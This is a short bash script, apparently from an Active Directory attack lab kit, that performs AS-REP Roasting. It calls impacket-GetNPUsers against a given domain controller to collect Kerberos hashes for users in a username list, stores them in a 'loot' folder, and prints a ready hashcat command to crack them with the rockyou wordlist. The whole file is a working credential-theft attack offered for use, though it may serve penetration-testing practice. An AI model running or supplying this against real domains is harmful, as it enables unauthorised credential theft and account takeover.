#!/bin/bash
# AS-REP Roasting against known/enumerated usernames
# Usage: ./02_asrep_roast.sh <DOMAIN> <DC_IP> <USERNAMES_FILE>

DOMAIN="${1:-vulncorp.local}"
DC_IP="${2:-192.168.56.10}"
USERFILE="${3:-usernames.txt}"

impacket-GetNPUsers "$DOMAIN"/ -usersfile "$USERFILE" -no-pass \
  -dc-ip "$DC_IP" -format hashcat -outputfile ../loot/asrep_hashes.txt

echo "[*] Hashes (if any) saved to loot/asrep_hashes.txt"
echo "[*] Crack with: hashcat -m 18200 loot/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force"
